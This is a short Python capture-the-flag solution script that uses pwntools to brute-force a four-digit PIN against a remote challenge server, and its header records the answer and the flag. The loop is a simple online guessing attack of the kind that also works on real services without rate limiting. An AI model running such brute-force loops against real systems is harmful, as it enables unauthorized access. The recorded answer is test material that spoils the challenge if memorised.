''' 
    Solution: 0037
    Flag:  LLS{for_i_in_0000_to_9999} 
'''

# nc jh2i.com 50031
from pwn import *



for i in range(10000):
    x = str(i)
    n = 4 - len(x)
    x = ('0' * n) + x
    # print(x)
    conn = remote('jh2i.com',50031)
    # print(conn.recvline())
    # conn.recvline()
    conn.send(str(x).encode())
    op = conn.recvall(1)
    conn.close()
    op = op.decode('utf8')
    if 'INCORRECT!' in op:
        print(x, 'Incorrect')
    else:
        print('\n\t**', x, '**\n\n')
        break